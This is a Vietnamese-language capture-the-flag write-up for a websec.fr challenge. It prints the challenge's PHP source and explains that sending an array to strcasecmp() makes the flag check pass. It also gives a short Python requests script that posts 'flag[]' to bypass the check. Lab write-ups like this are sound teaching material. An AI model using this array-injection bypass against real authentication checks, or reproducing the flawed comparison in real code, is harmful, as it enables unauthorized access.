# Đoạn code xử lý logic
```PHP
<?php
include "flag.php";

function sleep_rand() { /* I wish php5 had random_int() */
        $range = 100000;
        $bytes = (int) (log($range, 2) / 8) + 1;
        do {  /* Side effect: more random cpu cycles wasted ;) */
            $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
        } while ($rnd >= $range);
        usleep($rnd);
}
?>
<div class="container">
    <div class="row">
        <form class="form-inline" method='post'>
            <input name='flag' class='form-control' type='text' placeholder='Guessed flag'>
            <input class="form-control btn btn-default" name="submit" value='Go' type='submit'>
        </form>
    </div>
</div>
<?php
if (isset ($_POST['flag'])):
    sleep_rand(); /* This makes timing-attack impractical. */
?>
<div class="container">
    <div class="row">
        <?php
        if (! strcasecmp ($_POST['flag'], $flag))
            echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
        else
            echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
        ?>
    </div>
</div>
<?php endif ?>
```

# Phân tích luồng hoạt động  
Dòng 6-13 thực hiện việc tạo 1 thời gian nghỉ luôn lớn hơn 0.1s  
Dòng 18 nhận dữ liệu đầu vào qua ô text và gán vào biến flag  
Dòng 30-33, thực hiện việc kiểm tra flag thông qua hàm strcasecmp().  

Trước tiên ta cần hiểu về hàm strcasecmp(). Hàm này nhận 2 chuỗi đầu vào và thực hiện so sánh với nhau, và nó trả về giá trị 0 nếu 2 chuỗi bằng nhau.  
Vậy nên nếu ta nhập vào giá trị trùng khớp với flag thì nó sẽ là phủ định cảu 0 chính là 1. Tuy nhiến nếu chúng ta truyền vào 1 mảng thay vì 1 chuỗi thì sao. Lúc đó, hàm này sẽ không thể so sánh được và trả về giá trị NULL (đồng thời ném ra một cảnh báo Warning ngầm bên trong hệ thống). Đồng thời phủ định của NULL sẽ là true => điều kiện luôn đúng.

Bài này tôi sử dụng Burpsuite để thực hiện việc chuyển đổi dữ liệu gửi đi thành kiểu mảng hoặc bạn có thể sử dụng payload ở bên dưới:  

```PYTHON
import requests

burp0_url = "https://websec.fr:443/level17/index.php"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://websec.fr/",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://websec.fr",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
    }
burp0_data = {"flag[]": "anything", "submit": "Go"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
```
